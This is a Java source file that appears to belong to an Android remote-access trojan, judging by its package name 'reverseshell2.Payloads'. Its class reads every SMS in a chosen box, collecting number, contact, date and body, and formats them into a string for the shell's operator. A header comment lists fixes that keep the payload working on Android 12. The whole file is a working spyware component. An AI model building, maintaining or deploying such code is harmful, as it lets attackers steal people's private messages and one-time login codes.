package com.example.reverseshell2.Payloads;

import android.Manifest;
import android.content.Context;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.Uri;
import android.os.Build;
import android.provider.Telephony;

import java.util.Date;

/**
 * SMS reader, updated for Android 12.
 *
 * Changes for Android 12:
 *  1. READ_SMS is a DANGEROUS runtime permission (Android 6+). On Android 12 it
 *     MUST be granted at runtime before reading content://sms/... . This class
 *     now checks the permission and returns a clear message if missing.
 *  2. Fixed cursor iteration (count-based for loop with manual moveToNext() was
 *     fragile). Now uses do/while moveToNext().
 *  3. Cursor is now closed in a finally block (resource leak fix).
 *  4. DATE BUG FIXED - the old code did "new Date(epoch * 1000)". SMS date
 *     column is already in milliseconds, so multiplying by 1000 produced a date
 *     ~1000x too large (year ~51381). Now uses the millisecond value directly.
 *  5. Null-safe columns - person/body/address may be null.
 *  6. Telephony.Sms constants used instead of raw string column names.
 */
public class readSMS {

    Context context;

    public readSMS(Context context) {
        this.context = context;
    }

    public String readSMSBox(String box) {

        // Android 6+ requires READ_SMS at runtime.
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            boolean granted = context.checkSelfPermission(Manifest.permission.READ_SMS)
                    == PackageManager.PERMISSION_GRANTED;
            if (!granted) {
                return "Read SMS Permission Not Granted\n";
            }
        }

        Uri SMSURI = Uri.parse("content://sms/" + box);
        Cursor cur = null;
        StringBuilder sms = new StringBuilder();

        try {
            cur = context.getContentResolver().query(SMSURI, null, null, null, null);

            if (cur != null && cur.moveToFirst()) {
                int index = 0;
                do {
                    String number = cur.getString(cur.getColumnIndexOrThrow(Telephony.Sms.ADDRESS));
                    String date = cur.getString(cur.getColumnIndexOrThrow(Telephony.Sms.DATE));
                    String person = cur.getString(cur.getColumnIndexOrThrow(Telephony.Sms.PERSON));
                    String body = cur.getString(cur.getColumnIndexOrThrow(Telephony.Sms.BODY));

                    // The DATE column is already in milliseconds since epoch.
                    long millis = Long.parseLong(date);
                    Date fDate = new Date(millis);

                    sms.append("#").append(index).append("\n");
                    sms.append("Number : ").append(number == null ? "" : number).append("\n");
                    sms.append("Person : ").append(person == null ? "" : person).append("\n");
                    sms.append("Date : ").append(fDate).append("\n");
                    sms.append("Body : ").append(body == null ? "" : body).append("\n");
                    sms.append("\n");
                    index++;
                } while (cur.moveToNext());
                sms.append("\n");
            }
        } catch (SecurityException e) {
            return "Read SMS Permission Not Granted\n";
        } catch (Exception e) {
            return "Error reading SMS\n";
        } finally {
            if (cur != null) {
                cur.close();
            }
        }

        return sms.length() == 0 ? "No SMS Found\n" : sms.toString();
    }
}

